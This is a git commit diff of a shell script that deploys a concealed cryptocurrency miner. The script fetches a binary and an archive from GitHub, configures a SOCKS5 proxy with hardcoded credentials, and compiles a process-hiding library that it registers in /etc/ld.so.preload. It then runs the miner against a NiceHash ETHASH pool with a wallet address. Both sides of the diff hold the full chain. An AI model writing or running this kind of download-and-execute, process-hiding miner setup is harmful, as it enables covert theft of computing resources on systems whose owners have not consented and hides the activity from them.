f60a059bd3487bc4cde7301d59479d932a3e26ff
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-03-02 15:42:28 +0000

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -1,48 +1,47 @@
-#!/bin/sh 
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime 
-dpkg-reconfigure --frontend noninteractive tzdata 
- 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl 
- 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz 
- 
-tar -xvzf graphics.tar.gz 
- 
-cat > graftcp/local/graftcp-local.conf <<END 
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233 
 loglevel = 1 
-socks5 = 52.15.235.202:1080 
+socks5 = 143.198.171.112:1080 
 socks5_username = mikrotik999 
 socks5_password = Elibawnos 
-END 
- 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf & 
- 
-sleep .2 
- 
-echo " " 
-echo " " 
- 
-echo "**" 
- 
-./graftcp/graftcp curl ifconfig.me 
- 
-echo " " 
-echo " " 
- 
-echo "**" 
- 
-echo " " 
-echo " " 
- 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
-chmod +x bezzHash 
- 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
-unzip magicBezzHash.zip 
-make 
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
-mv libprocesshider.so /usr/local/lib/ 
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
+END
 
-./graftcp/graftcp ./bezzHash --url=ssl://36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "**"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/jijij//main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-east.nicehash.com:3353 --user 36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.BAKULKULI --ethstratum ETHPROXY
